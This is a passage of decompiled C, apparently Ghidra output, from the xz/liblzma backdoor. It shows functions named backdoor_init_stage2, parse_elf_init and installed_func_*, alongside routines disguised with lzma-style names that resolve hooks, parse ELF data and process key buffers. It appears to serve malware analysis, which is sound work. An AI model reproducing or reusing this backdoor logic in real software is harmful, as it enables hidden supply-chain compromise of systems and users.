  if (*piVar3 != 0) {
    puVar24 = (undefined4 *)cpuid_Version_info(1);
    uVar4 = puVar24[1];
    uVar5 = puVar24[2];
    uVar6 = puVar24[3];
    *(undefined4 *)(puVar37 + 1) = *puVar24;
    *(undefined4 *)(puVar37 + 2) = uVar4;
    *(undefined4 *)(puVar37 + 3) = uVar6;
    *(uint *)(puVar37 + 4) = uVar5;
  }
  return ZEXT416(uVar5) << 0x40;
}



// WARNING: Removing unreachable block (ram,0x00107004)
// WARNING: Removing unreachable block (ram,0x00106ff9)

undefined8 backdoor_init_stage2(undefined8 *param_1)

{
  int *piVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined8 uVar5;
  long lVar6;
  code **ppcVar7;
  undefined4 *puVar8;
  undefined auVar9 [16];
  code *local_140;
  code *local_138;
  undefined8 *local_130;
  undefined local_128 [136];
  undefined4 local_a0 [2];
  code **local_98;
  ctx2 *local_90;
  undefined local_88 [104];
  undefined8 *local_20;
  
  puVar8 = (undefined4 *)local_128;
  for (lVar6 = 0x22; lVar6 != 0; lVar6 = lVar6 + -1) {
    *puVar8 = 0;
    puVar8 = puVar8 + 1;
  }
  puVar8 = local_a0;
  for (lVar6 = 0x22; lVar6 != 0; lVar6 = lVar6 + -1) {
    *puVar8 = 0;
    puVar8 = puVar8 + 1;
  }
  local_140 = _Llzma_code_part_1;
  local_138 = _Llzma_index_memusage_part_0;
  local_130 = &global_ctx;
  lzma_check_init(local_88,0);
  ppcVar7 = &local_140;
  auVar9 = backdoor_vtbl_init((ctx2 *)local_128);
  do {
    local_90 = auVar9._8_8_;
    if (auVar9._0_4_ == 0) {
      local_98 = ppcVar7;
      local_20 = param_1;
      uVar5 = parse_elf_init(local_a0);
      return uVar5;
    }
    local_128._48_8_ = ppcVar7;
    auVar9 = backdoor_vtbl_init(local_90);
  } while (auVar9._0_4_ != 5);
  *param_1 = 1;
  param_1[1] = 0;
  param_1[2] = 0;
  param_1[3] = 0;
  param_1[4] = 0;
  piVar1 = (int *)cpuid_basic_info(0);
  if (*piVar1 != 0) {
    puVar8 = (undefined4 *)cpuid_Version_info(1);
    uVar2 = puVar8[1];
    uVar3 = puVar8[2];
    uVar4 = puVar8[3];
    *(undefined4 *)(param_1 + 1) = *puVar8;
    *(undefined4 *)(param_1 + 2) = uVar2;
    *(undefined4 *)(param_1 + 3) = uVar4;
    *(undefined4 *)(param_1 + 4) = uVar3;
  }
  return 0;
}



long strlen(char *param_1)

{
  long lVar1;
  
  if (*param_1 != '\0') {
    lVar1 = 0;
    do {
      lVar1 = lVar1 + 1;
    } while (param_1[lVar1] != '\0');
    return lVar1;
  }
  return 0;
}



long strnlen(char *z,long maxlen)

{
  long lVar1;
  
  lVar1 = 0;
  if (maxlen == 0) {
    return maxlen;
  }
  do {
    if (z[lVar1] == '\0') {
      return lVar1;
    }
    lVar1 = lVar1 + 1;
  } while (maxlen != lVar1);
  return maxlen;
}



long FUN_001070a0(int param_1,long param_2,long param_3,long param_4)

{
  long lVar1;
  int *piVar2;
  long lVar3;
  
  if (param_3 == 0) {
    return 0;
  }
  if ((((param_1 < 0) || (param_4 == 0)) || (*(long *)(param_4 + 0x48) == 0)) ||
     (lVar3 = param_3, *(long *)(param_4 + 0x50) == 0)) {
LAB_001070be:
    param_3 = -1;
  }
  else {
    do {
      while( true ) {
        lVar1 = (**(code **)(param_4 + 0x48))(param_1,param_2,lVar3);
        if (-1 < lVar1) break;
        piVar2 = (int *)(**(code **)(param_4 + 0x50))();
        if (*piVar2 != 4) goto LAB_001070be;
      }
      if (lVar1 == 0) goto LAB_001070be;
      param_2 = param_2 + lVar1;
      lVar3 = lVar3 - lVar1;
    } while (lVar3 != 0);
  }
  return param_3;
}



long FUN_00107110(undefined4 param_1,long param_2,long param_3,long param_4)

{
  long lVar1;
  int *piVar2;
  long lVar3;
  
  if (param_3 == 0) {
    return 0;
  }
  if (((((byte)(param_4 == 0 | (byte)((uint)param_1 >> 0x1f)) == 0) && (param_2 != 0)) &&
      (*(long *)(param_4 + 0x38) != 0)) && (lVar3 = param_3, *(long *)(param_4 + 0x50) != 0)) {
    do {
      while( true ) {
        lVar1 = (**(code **)(param_4 + 0x38))(param_1,param_2,lVar3);
        if (-1 < lVar1) break;
        piVar2 = (int *)(**(code **)(param_4 + 0x50))();
        if (*piVar2 != 4) goto LAB_0010713f;
      }
      if (lVar1 == 0) goto LAB_0010713f;
      param_2 = param_2 + lVar1;
      lVar3 = lVar3 - lVar1;
    } while (lVar3 != 0);
  }
  else {
LAB_0010713f:
    param_3 = -1;
  }
  return param_3;
}



bool mem_empty(uint64_t *ptr,uint n)

{
  long i;
  uint64_t *p;
  
  i = 0;
  do {
    if (n <= (uint)i) {
      return false;
    }
    p = ptr + i;
    i = i + 1;
  } while (*p != 0);
  return true;
}



undefined4
FUN_001071b0(long param_1,uint param_2,undefined8 param_3,long param_4,long param_5,long param_6)

{
  code *pcVar1;
  bool bVar2;
  int iVar3;
  undefined7 extraout_var;
  long lVar4;
  undefined8 uVar5;
  uint local_3c [3];
  
  local_3c[0] = 0;
  if (((((param_1 != 0) && (param_2 != 0)) && (param_4 != 0)) && ((param_5 != 0 && (param_6 != 0))))
     && ((lVar4 = param_6, bVar2 = mem_empty((uint64_t *)(param_6 + 0xa0),6),
         (int)CONCAT71(extraout_var,bVar2) == 0 &&
         (lVar4 = (**(code **)(lVar4 + 0xa0))(), lVar4 != 0)))) {
    pcVar1 = *(code **)(param_6 + 0xa8);
    uVar5 = (**(code **)(param_6 + 200))();
    iVar3 = (*pcVar1)(lVar4,uVar5,0,param_3,param_4);
    if (iVar3 == 1) {
      iVar3 = (**(code **)(param_6 + 0xb0))(lVar4,param_5,local_3c,param_1,param_2);
      if (((iVar3 == 1) && (-1 < (int)local_3c[0])) &&
         ((iVar3 = (**(code **)(param_6 + 0xb8))(lVar4,param_5 + (int)local_3c[0],local_3c),
          iVar3 == 1 && ((-1 < (int)local_3c[0] && (local_3c[0] <= param_2)))))) {
        (**(code **)(param_6 + 0xc0))(lVar4);
        return 1;
      }
    }
    if (*(code **)(param_6 + 0xc0) != (code *)0x0) {
      (**(code **)(param_6 + 0xc0))(lVar4);
    }
  }
  return 0;
}



bool FUN_001072d0(long param_1,long param_2,undefined8 param_3,ulong param_4,long param_5)

{
  code *pcVar1;
  int iVar2;
  undefined8 uVar3;
  bool bVar4;
  
  if ((((param_1 == 0) || (param_2 == 0)) || (param_4 < 0x20)) || (param_5 == 0)) {
    bVar4 = false;
  }
  else {
    pcVar1 = *(code **)(param_5 + 0xf0);
    bVar4 = false;
    if ((pcVar1 != (code *)0x0) && (*(code **)(param_5 + 0x58) != (code *)0x0)) {
      uVar3 = (**(code **)(param_5 + 0x58))();
      iVar2 = (*pcVar1)(param_1,param_2,param_3,0,uVar3,0);
      bVar4 = iVar2 == 1;
    }
  }
  return bVar4;
}



undefined8 FUN_00107340(uint *param_1,ulong param_2,long *param_3,long param_4,long param_5)

{
  uint uVar1;
  int iVar2;
  ulong n;
  
  if (((param_5 != 0 && 5 < param_2) && (param_4 != 0)) && (*(long *)(param_5 + 0x100) != 0)) {
    *param_3 = 0;
    if (((*(code **)(param_5 + 0x68) != (code *)0x0) &&
        (uVar1 = (**(code **)(param_5 + 0x68))(param_4), uVar1 < 0x4001)) &&
       ((uVar1 = uVar1 + 7 >> 3, uVar1 != 0 && (n = (ulong)uVar1, n <= param_2 - 6)))) {
      *(undefined *)(param_1 + 1) = 0;
      iVar2 = (**(code **)(param_5 + 0x100))(param_4,(long)param_1 + 5);
      if ((long)iVar2 == n) {
        if (*(char *)((long)param_1 + 5) < '\0') {
          n = n + 1;
          uVar1 = uVar1 + 1;
        }
        else {
          memmove((byte *)(param_1 + 1),(long)param_1 + 5,n);
        }
        *param_1 = uVar1 >> 0x18 | (uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18;
        *param_3 = n + 4;
        return 1;
      }
    }
  }
  return 0;
}



void FUN_00107420(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5,undefined4 param_6,undefined4 param_7,undefined4 param_8,
                 long param_9,undefined4 param_10,undefined8 param_11,undefined8 param_12,
                 undefined8 param_13,undefined8 param_14)

{
  char in_AL;
  undefined local_d1;
  undefined4 local_d0;
  undefined4 local_cc;
  undefined *local_c8;
  undefined *local_c0;
  undefined local_b8 [24];
  undefined8 local_a0;
  undefined8 local_98;
  undefined8 local_90;
  undefined4 local_88;
  undefined4 local_78;
  undefined4 local_68;
  undefined4 local_58;
  undefined4 local_48;
  undefined4 local_38;
  undefined4 local_28;
  undefined4 local_18;
  
  if (in_AL != '\0') {
    local_88 = param_1;
    local_78 = param_2;
    local_68 = param_3;
    local_58 = param_4;
    local_48 = param_5;
    local_38 = param_6;
    local_28 = param_7;
    local_18 = param_8;
  }
  local_d1 = 0;
  local_c8 = &stack0x00000008;
  local_d0 = 0x18;
  local_c0 = local_b8;
  local_cc = 0x30;
  local_a0 = param_12;
  local_98 = param_13;
  local_90 = param_14;
  (**(code **)(param_9 + 0x58))(&local_d1,&local_d1,0,0,param_10,0,param_11,&local_d0);
  return;
}



undefined  [16] FUN_001074d0(long param_1,ulong *param_2,ulong param_3,undefined8 param_4)

{
  undefined auVar1 [16];
  ulong uVar2;
  undefined8 uVar3;
  ulong uVar4;
  ulong uVar5;
  undefined auVar6 [16];
  
  if (((param_1 == 0) || (param_3 == 0)) || (*(code **)(param_3 + 8) == (code *)0x0)) {
    auVar1._8_8_ = 0;
    auVar1._0_8_ = param_3;
    return auVar1 << 0x40;
  }
  uVar2 = (**(code **)(param_3 + 8))();
  if (uVar2 - 8 < 0x80) {
    uVar4 = 0;
    do {
      uVar5 = uVar4;
      if (*(long *)(param_1 + uVar4 * 8) == 0) break;
      uVar4 = (ulong)((int)uVar4 + 1);
      uVar5 = uVar2 >> 3;
    } while (uVar4 < uVar2 >> 3);
    *param_2 = uVar5;
    uVar3 = 1;
  }
  else {
    uVar3 = 0;
  }
  auVar6._8_8_ = param_4;
  auVar6._0_8_ = uVar3;
  return auVar6;
}



undefined8 FUN_00107530(long param_1,undefined8 param_2,undefined8 param_3,long param_4)

{
  ulong uVar1;
  int iVar2;
  undefined8 uVar3;
  long lVar4;
  undefined *puVar5;
  ulong local_1060;
  long local_1058;
  long local_1050;
  undefined local_1042 [16];
  undefined local_1032 [4098];
  
  puVar5 = local_1032;
  for (lVar4 = 0xffa; lVar4 != 0; lVar4 = lVar4 + -1) {
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  local_1042 = ZEXT816(0);
  local_1060 = 0;
  if (((param_4 != 0) && (param_1 != 0)) && (*(code **)(param_4 + 0x60) != (code *)0x0)) {
    local_1058 = 0;
    local_1050 = 0;
    (**(code **)(param_4 + 0x60))(param_1,&local_1050,&local_1058,0);
    if ((local_1058 != 0) && (local_1050 != 0)) {
      iVar2 = FUN_00107340(local_1042,0x100a,&local_1060,local_1058,param_4);
      uVar1 = local_1060;
      if (((iVar2 != 0) &&
          ((local_1060 < 0x100a &&
           (iVar2 = FUN_00107340(local_1042 + local_1060,0x100a - local_1060,&local_1060,local_1050,
                                 param_4), iVar2 != 0)))) && (uVar1 + local_1060 < 0x100b)) {
        uVar3 = FUN_001072d0(local_1042,uVar1 + local_1060,param_2,param_3,param_4);
        return uVar3;
      }
    }
  }
  return 0;
}



undefined8
FUN_00107650(int *param_1,long param_2,ulong param_3,ulong param_4,undefined8 param_5,long param_6,
            long param_7)

{
  ulong uVar1;
  long lVar2;
  bool bVar3;
  int iVar4;
  uint uVar5;
  undefined8 uVar6;
  undefined8 uVar7;
  ulong uVar8;
  ulong uVar9;
  undefined7 extraout_var;
  long lVar10;
  long lVar11;
  undefined4 *puVar12;
  undefined local_c1 [16];
  undefined4 local_b1 [32];
  
  if (param_1 == (int *)0x0) {
    return 0;
  }
  if (param_2 == 0) {
    return 0;
  }
  if (param_4 == 0) {
    return 0;
  }
  if (0xffffffffffffffde < param_3) {
    return 0;
  }
  uVar1 = param_3 + 0x20;
  if (param_7 == 0) {
    return 0;
  }
  if (param_4 < uVar1) {
    return 0;
  }
  lVar2 = *(long *)(param_7 + 8);
  if (lVar2 == 0) {
    return 0;
  }
  iVar4 = *param_1;
  if (iVar4 == 2) {
    lVar10 = *(long *)(param_1 + 8);
    local_c1 = ZEXT816(0);
    puVar12 = local_b1;
    for (lVar11 = 0x79; lVar11 != 0; lVar11 = lVar11 + -1) {
      *(bool *)puVar12 = param_4 < uVar1;
      puVar12 = (undefined4 *)((long)puVar12 + 1);
    }
    if (lVar10 == 0) {
      return 0;
    }
    if (*(code **)(lVar2 + 0x48) == (code *)0x0) {
      return 0;
    }
    if (*(long *)(lVar2 + 0x50) == 0) {
      return 0;
    }
    if (*(long *)(lVar2 + 0x40) == 0) {
      return 0;
    }
    uVar6 = (**(code **)(lVar2 + 0x48))(lVar10);
    uVar7 = (**(code **)(lVar2 + 0x50))(lVar10);
    uVar8 = (**(code **)(lVar2 + 0x40))(uVar7,uVar6,4,0,0,0);
    if (0x85 < uVar8) {
      return 0;
    }
    uVar5 = (uint)uVar8;
    local_c1._0_4_ = uVar5 >> 0x18 | (uVar5 & 0xff0000) >> 8 | (uVar5 & 0xff00) << 8 | uVar5 << 0x18
    ;
    uVar9 = (**(code **)(lVar2 + 0x40))(uVar7,uVar6,4,local_c1 + 4,uVar8,0);
    if (uVar8 != uVar9) {
      return 0;
    }
    lVar10 = uVar8 + 4;
  }
  else {
    if (iVar4 < 3) {
      if (iVar4 == 0) {
        iVar4 = FUN_00107530(*(undefined8 *)(param_1 + 2),param_2 + param_3,param_4 - param_3,lVar2)
        ;
      }
      else {
        if (iVar4 != 1) {
          return 0;
        }
        iVar4 = FUN_00103b60(*(undefined8 *)(param_1 + 4),param_2 + param_3,param_4 - param_3,
                             param_7);
      }
      goto LAB_00107718;
    }
    if (iVar4 != 3) {
      return 0;
    }
    lVar10 = *(long *)(param_1 + 0xc);
    puVar12 = local_b1;
    for (lVar11 = 5; lVar11 != 0; lVar11 = lVar11 + -1) {
      *puVar12 = 0;
      puVar12 = puVar12 + 1;
    }
    if (lVar10 == 0) {
      return 0;
    }
    local_c1._4_12_ = SUB1612(ZEXT816(0),4);
    local_c1._0_4_ = 0x20000000;
    lVar11 = 0;
    do {
      local_c1[lVar11 + 4] = *(undefined *)(lVar10 + lVar11);
      lVar11 = lVar11 + 1;
    } while (lVar11 != 0x20);
    lVar10 = 0x24;
  }
  iVar4 = FUN_001072d0(local_c1,lVar10,param_2 + param_3,param_4 - param_3,lVar2);
LAB_00107718:
  if ((((iVar4 != 0) && (lVar2 = *(long *)(param_7 + 8), lVar2 != 0)) &&
      (bVar3 = mem_empty((uint64_t *)(lVar2 + 0x70),6), (int)CONCAT71(extraout_var,bVar3) == 0)) &&
     ((param_6 != 0 && (lVar10 = (**(code **)(lVar2 + 0x70))(0x440,0,param_6,0x39), lVar10 != 0))))
  {
    lVar11 = (**(code **)(lVar2 + 0x78))();
    if (lVar11 != 0) {
      iVar4 = (**(code **)(lVar2 + 0x80))(lVar11,0,0,0,lVar10);
      if ((iVar4 == 1) &&
         (iVar4 = (**(code **)(lVar2 + 0x88))(lVar11,param_5,0x72,param_2,uVar1), iVar4 == 1)) {
        (**(code **)(lVar2 + 0x90))(lVar11);
        (**(code **)(lVar2 + 0x98))(lVar10);
        return 1;
      }
      (**(code **)(lVar2 + 0x90))(lVar11);
    }
    (**(code **)(lVar2 + 0x98))(lVar10);
  }
  return 0;
}



undefined8 _Llength_encoder_reset_0(long *param_1)

{
  long lVar1;
  undefined8 uVar2;
  
  uVar2 = 0;
  if (param_1[3] - 0x20U < 0x21) {
    lVar1 = 0;
    while (-1 < *(char *)(*param_1 + lVar1)) {
      lVar1 = lVar1 + 1;
      if (param_1[3] == lVar1) {
        return 0;
      }
    }
    uVar2 = 1;
  }
  return uVar2;
}



undefined  [16]
_Lstream_decoder_mt_get_progress_0
          (undefined8 *param_1,long param_2,undefined8 *param_3,undefined8 *param_4,
          undefined8 param_5)

{
  undefined auVar1 [16];
  int iVar2;
  ulong uVar3;
  ulong uVar4;
  long lVar5;
  undefined8 uVar6;
  undefined8 uVar7;
  undefined auVar8 [16];
  
  if (param_2 == 0) {
    auVar1._8_8_ = 0;
    auVar1._0_8_ = param_3;
    return auVar1 << 0x40;
  }
  if (((param_1 != (undefined8 *)0x0) && (param_3 != (undefined8 *)0x0)) &&
     (param_4 != (undefined8 *)0x0)) {
    if ((char)(*(byte *)(param_2 + 0x57) & *(byte *)(param_2 + 0x56)) < '\0') {
      uVar3 = 0;
      uVar4 = 0;
      lVar5 = 0x48;
    }
    else {
      uVar3 = (ulong)((int)(char)*(byte *)(param_2 + 0x57) << 3);
      uVar4 = (ulong)((int)(char)*(byte *)(param_2 + 0x56) << 3);
      lVar5 = uVar3 + 8;
      if (uVar3 < uVar4) {
        lVar5 = uVar4 + 8;
      }
    }
    iVar2 = _Lhc_find_func_1(param_1,lVar5,param_2);
    if (iVar2 != 0) {
      if (*(char *)(param_2 + 0x56) < '\0') {
        uVar7 = *param_1;
      }
      else {
        uVar7 = *(undefined8 *)(uVar4 + (long)param_1);
      }
      *param_3 = uVar7;
      if (*(char *)(param_2 + 0x57) < '\0') {
        uVar6 = param_1[3];
      }
      else {
        uVar6 = *(undefined8 *)((long)param_1 + uVar3);
      }
      *param_4 = uVar6;
      iVar2 = _Lhc_find_func_1(uVar7,uVar6,param_2);
      uVar3 = (ulong)(iVar2 != 0);
      goto LAB_00107a27;
    }
  }
  uVar3 = 0;
LAB_00107a27:
  auVar8._8_8_ = param_5;
  auVar8._0_8_ = uVar3;
  return auVar8;
}



undefined  [16] _Lthreads_stop_0(void **param_1,long param_2,ulong param_3,undefined8 param_4)

{
  undefined8 *puVar1;
  undefined auVar2 [16];
  int iVar3;
  ulong uVar4;
  ulong uVar5;
  long *plVar6;
  undefined8 *puVar7;
  long lVar8;
  uint uVar9;
  undefined auVar10 [16];
  
  if (param_1 == (void **)0x0) {
    auVar2._8_8_ = 0;
    auVar2._0_8_ = param_3;
    return auVar2 << 0x40;
  }
  if ((param_2 != 0) && (*(long *)(param_2 + 0x48) != 0)) {
    iVar3 = _Lhc_find_func_1(*(long *)(param_2 + 0x48),8,param_2);
    if (iVar3 != 0) {
      lVar8 = **(long **)(param_2 + 0x48);
      iVar3 = _Lhc_find_func_1(lVar8,0x20,param_2);
      if (iVar3 != 0) {
        plVar6 = *(long **)(lVar8 + 0x10);
        if (-1 < *(char *)(param_2 + 0x55)) {
          plVar6 = *(long **)(lVar8 + ((int)*(char *)(param_2 + 0x55) << 2));
        }
        lVar8 = 0x48;
        if (-1 < (char)(*(byte *)(param_2 + 0x56) & *(byte *)(param_2 + 0x57))) {
          uVar5 = (ulong)((int)(char)*(byte *)(param_2 + 0x57) << 3);
          uVar4 = (ulong)((int)(char)*(byte *)(param_2 + 0x56) << 3);
          lVar8 = uVar5 + 8;
          if (uVar5 < uVar4) {
            lVar8 = uVar4 + 8;
          }
        }
        iVar3 = _Lhc_find_func_1(plVar6,8,param_2);
        if (iVar3 != 0) {
          iVar3 = _Lhc_find_func_1(*plVar6,0x400,param_2);
          if (iVar3 != 0) {
            puVar7 = (undefined8 *)*plVar6;
            if (*(char *)(param_2 + 0x54) < '\0') {
              uVar9 = 0;
              puVar1 = puVar7 + 0x80;
              for (; puVar7 < puVar1; puVar7 = puVar7 + 1) {
                iVar3 = _Lhc_find_func_1(puVar7,lVar8,param_2);
                if (iVar3 != 0) {
                  iVar3 = _Lstream_decoder_mt_get_progress_0(*puVar7,param_2,param_1,param_1 + 3);
                  if (iVar3 != 0) {
                    if (uVar9 < 2) {
                      iVar3 = table_get(*param_1,(void *)((long)*param_1 + 7));
                      if ((iVar3 == 0x990) || (iVar3 == 0xd08)) {
                        uVar9 = uVar9 + 1;
                      }
                    }
                    else {
                      iVar3 = _Llength_encoder_reset_0(param_1);
                      if (iVar3 != 0) {
                        uVar4 = 1;
                        goto LAB_00107bc8;
                      }
                    }
                  }
                }
              }
            }
            else {
              iVar3 = _Lstream_decoder_mt_get_progress_0
                                (*(undefined8 *)
                                  ((long)((int)*(char *)(param_2 + 0x54) << 3) + (long)puVar7),
                                 param_2,param_1,param_1 + 3);
              if (iVar3 != 0) {
                iVar3 = _Llength_encoder_reset_0(param_1);
                uVar4 = (ulong)(iVar3 != 0);
                goto LAB_00107bc8;
              }
            }
          }
        }
      }
    }
  }
  uVar4 = 0;
LAB_00107bc8:
  auVar10._8_8_ = param_4;
  auVar10._0_8_ = uVar4;
  return auVar10;
}



undefined8 installed_func_2(int *param_1,int param_2,long param_3)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  int iVar4;
  int local_3c [3];
  
  if (param_1 == (int *)0x0) {
    return 0;
  }
  if (param_3 != 0) {
    iVar4 = -1;
    iVar3 = 0;
    do {
      local_3c[0] = 0;
      if ((*(code **)(param_3 + 0x60) != (code *)0x0) && (*(long *)(param_3 + 0x50) != 0)) {
        iVar1 = (**(code **)(param_3 + 0x60))(iVar3,0x7fffffff);
        if (iVar1 < 0) {
          piVar2 = (int *)(**(code **)(param_3 + 0x50))();
LAB_00107c41:
          if ((*piVar2 != 0x16) && (*piVar2 != 0x6b)) goto LAB_00107c60;
        }
        else {
          piVar2 = local_3c;
          if (iVar1 != 0) goto LAB_00107c41;
        }
        iVar4 = iVar4 + 1;
        if (iVar4 == param_2) {
          *param_1 = iVar3;
          return 1;
        }
      }
LAB_00107c60:
      iVar3 = iVar3 + 1;
    } while (iVar3 != 0x40);
  }
  return 0;
}



undefined8 installed_func_3(long param_1,int *param_2,undefined4 param_3,int param_4)

{
  int iVar1;
  int iVar2;
  undefined8 uVar3;
  int *piVar4;
  long lVar5;
  undefined local_39 [9];
  
  if (((param_1 == 0) || (lVar5 = *(long *)(param_1 + 0x10), lVar5 == 0)) || (param_2 == (int *)0x0)
     ) {
    return 0;
  }
  if (*(int ***)(param_1 + 0x48) != (int **)0x0) {
    piVar4 = **(int ***)(param_1 + 0x48);
    iVar1 = _Lhc_find_func_1(piVar4,4,param_1);
    if (iVar1 != 0) {
      if (param_4 == 0) {
        iVar1 = *piVar4;
      }
      else {
        if (param_4 != 1) {
          return 0;
        }
        iVar1 = piVar4[1];
      }
      local_39[0] = 0;
      lVar5 = *(long *)(param_1 + 0x10);
      if (((-1 < iVar1) && (lVar5 != 0)) &&
         ((*(long *)(lVar5 + 0x48) != 0 && (*(long *)(lVar5 + 0x50) != 0)))) {
        do {
          iVar2 = (**(code **)(lVar5 + 0x48))(iVar1,local_39,0);
          piVar4 = (int *)(**(code **)(lVar5 + 0x50))();
          if (-1 < iVar2) goto LAB_00107d54;
        } while (*piVar4 == 4);
        if (*piVar4 != 9) {
LAB_00107d54:
          *param_2 = iVar1;
          return 1;
        }
      }
    }
    lVar5 = *(long *)(param_1 + 0x10);
  }
  uVar3 = installed_func_2(param_2,param_3,lVar5);
  return uVar3;
}



undefined8
_Llzma_block_unpadded_size_1(int param_1,int param_2,int param_3,int param_4,long param_5)

{
  int iVar1;
  long lVar2;
  long lVar3;
  int *piVar4;
  uint *puVar5;
  
  if ((((param_5 == 0) || (lVar2 = *(long *)(param_5 + 0x20), lVar2 == 0)) ||
      (lVar3 = *(long *)(lVar2 + 0x10), lVar3 == 0)) || (*(int *)(lVar2 + 4) == 0)) {
    return 0;
  }
  if (param_1 == 0) {
    piVar4 = *(int **)(lVar2 + 200);
    if (piVar4 == (int *)0x0) {
      return 0;
    }
    iVar1 = *piVar4;
    if (iVar1 < 3) {
      if (iVar1 < 0) {
        return 0;
      }
      *piVar4 = 3;
    }
    else if (iVar1 != 3) {
      return 0;
    }
  }
  if (param_2 != 0) {
    puVar5 = *(uint **)(lVar2 + 0xc0);
    if (puVar5 == (uint *)0x0) {
      return 0;
    }
    if (1 < *puVar5) {
      return 0;
    }
    *puVar5 = 0;
  }
  if (param_3 == 0) {
    param_4 = *(int *)(*(long **)(lVar2 + 0x38) + -1) + 1;
  }
  *(int *)(lVar2 + 0x40) = param_4;
  **(long **)(lVar2 + 0x38) = lVar3;
  return 1;
}



undefined8 _Llzma_rc_prices_1(byte *param_1,long param_2)

{
  byte bVar1;
  undefined4 *puVar2;
  ulong *puVar3;
  ulong uVar4;
  ulong *puVar5;
  ulong *puVar6;
  byte bVar7;
  
  puVar2 = *(undefined4 **)(param_2 + 0x30);
  if (((((param_1 == (byte *)0x0) || (puVar2 == (undefined4 *)0x0)) ||
       (puVar6 = *(ulong **)(puVar2 + 0xe), puVar6 == (ulong *)0x0)) ||
      ((puVar3 = *(ulong **)(puVar2 + 0x10), puVar3 == (ulong *)0x0 ||
       (*(ulong *)(puVar2 + 0x18) == 0)))) || (puVar2[1] == 0)) {
    return 0;
  }
  bVar1 = *param_1;
  bVar7 = bVar1 & 8;
  if ((bVar7 == 0) || (*(int *)(param_2 + 0x90) == 0)) {
    uVar4 = *puVar3;
    puVar5 = puVar3;
    if ((uVar4 != 0) &&
       ((*(ulong *)(param_2 + 0x58) <= uVar4 && (uVar4 < *(ulong *)(param_2 + 0x60))))) {
      *(ulong **)(puVar2 + 0xe) = puVar3;
      *(ulong **)(puVar2 + 0x10) = puVar6;
      puVar5 = puVar6;
      puVar6 = puVar3;
    }
    uVar4 = *puVar5;
    *(ulong *)(puVar2 + 0x12) = *puVar6;
    *(ulong *)(puVar2 + 0x14) = uVar4;
    if (bVar7 == 0) {
      *puVar2 = 1;
    }
    else if ((bVar1 & 0x10) != 0) {
      if (*(long *)(puVar2 + 4) == 0) {
        return 0;
      }
      if (*(long *)(puVar2 + 6) == 0) {
        return 0;
      }
      if (*(long *)(puVar2 + 8) == 0) {
        return 0;
      }
    }
    *puVar6 = *(ulong *)(puVar2 + 0x18);
  }
  return 1;
}



undefined8 _Lstream_encoder_mt_init_part_0(long param_1)

{
  int iVar1;
  ulong uVar2;
  bool bVar3;
  bool bVar4;
  
  if (param_1 == 0) {
    return 0;
  }
  iVar1 = *(int *)(param_1 + 0x104);
  if (iVar1 < 3) {
    if (0 < iVar1) {
      if (((*(ushort **)(param_1 + 0xf8) != (ushort *)0x0) && (0xad < *(ulong *)(param_1 + 0xe8)))
         && (uVar2 = (ulong)**(ushort **)(param_1 + 0xf8), *(ulong *)(param_1 + 0xe8) <= uVar2)) {
        if (uVar2 <= uVar2 + 0x60) {
          uVar2 = uVar2 + 0x60;
        }
        if (uVar2 <= *(ulong *)(param_1 + 0xe0)) {
          return 1;
        }
      }
      goto LAB_00107f31;
    }
    if (iVar1 != 0) goto LAB_00107f31;
    bVar3 = *(ulong *)(param_1 + 0xe8) < 0xae;
    bVar4 = *(ulong *)(param_1 + 0xe8) == 0xae;
  }
  else {
    bVar3 = iVar1 == 3;
    bVar4 = iVar1 == 4;
  }
  if (bVar3 || bVar4) {
    return 1;
  }
LAB_00107f31:
  *(undefined4 *)(param_1 + 0x104) = 0xffffffff;
  return 0;
}



undefined8 _Lworker_start_0(uint **param_1,ulong param_2,ulong *param_3,long param_4)

{
  uint *puVar1;
  char cVar2;
  ulong uVar3;
  uint *puVar4;
  uint uVar5;
  long lVar6;
  char *z;
  uint *puVar7;
  ulong maxlen;
  
  if ((param_1 == (uint **)0x0) || (param_2 < 7)) {
    return 0;
  }
  if ((param_3 != (ulong *)0x0) && (param_4 != 0)) {
    if (*(long *)(param_4 + 0x38) == 0) {
      return 0;
    }
    if (*(long *)(param_4 + 0x40) == 0) {
      return 0;
    }
    puVar7 = *param_1;
    if (CARRY8((ulong)puVar7,param_2)) {
      return 0;
    }
    uVar3 = 0;
    do {
      z = (char *)((long)puVar7 + uVar3);
      lVar6 = 0;
      maxlen = param_2 - uVar3;
      while( true ) {
        cVar2 = *(char *)(*(long *)(param_4 + 0x38) + lVar6);
        if ((z[lVar6] < cVar2) || (cVar2 < z[lVar6])) break;
        lVar6 = lVar6 + 1;
        if (lVar6 == 7) goto LAB_00107ff1;
      }
      lVar6 = 0;
      while( true ) {
        cVar2 = *(char *)(*(long *)(param_4 + 0x40) + lVar6);
        if ((z[lVar6] < cVar2) || (cVar2 < z[lVar6])) break;
        lVar6 = lVar6 + 1;
        if (lVar6 == 7) goto LAB_00107ff1;
      }
      uVar3 = uVar3 + 1;
    } while (param_2 - uVar3 != 6);
    z = (char *)0x0;
    maxlen = 6;
LAB_00107ff1:
    if ((7 < uVar3) && (z != (char *)0x0)) {
      uVar5 = *(uint *)(z + -8);
      uVar5 = uVar5 >> 0x18 | (uVar5 & 0xff0000) >> 8 | (uVar5 & 0xff00) << 8 | uVar5 << 0x18;
      if (0x10000 < uVar5) {
        return 0;
      }
      puVar1 = (uint *)(z + ((ulong)uVar5 - 8));
      if ((uint *)((long)puVar7 + param_2) < puVar1) {
        return 0;
      }
      uVar3 = strnlen(z,maxlen);
      if (maxlen <= uVar3) {
        return 0;
      }
      puVar7 = (uint *)(z + uVar3);
      if (puVar1 <= puVar7) {
        return 0;
      }
      uVar5 = *puVar7;
      uVar5 = uVar5 >> 0x18 | (uVar5 & 0xff0000) >> 8 | (uVar5 & 0xff00) << 8 | uVar5 << 0x18;
      if (0x10000 < uVar5) {
        return 0;
      }
      puVar7 = (uint *)((long)puVar7 + (ulong)(uVar5 + 4));
      if (puVar1 <= puVar7) {
        return 0;
      }
      uVar5 = *puVar7;
      uVar5 = uVar5 >> 0x18 | (uVar5 & 0xff0000) >> 8 | (uVar5 & 0xff00) << 8 | uVar5 << 0x18;
      if (0x10000 < uVar5) {
        return 0;
      }
      puVar4 = puVar7 + 1;
      if ((uint *)((ulong)uVar5 + (long)puVar4) <= puVar1) {
        return 0;
      }
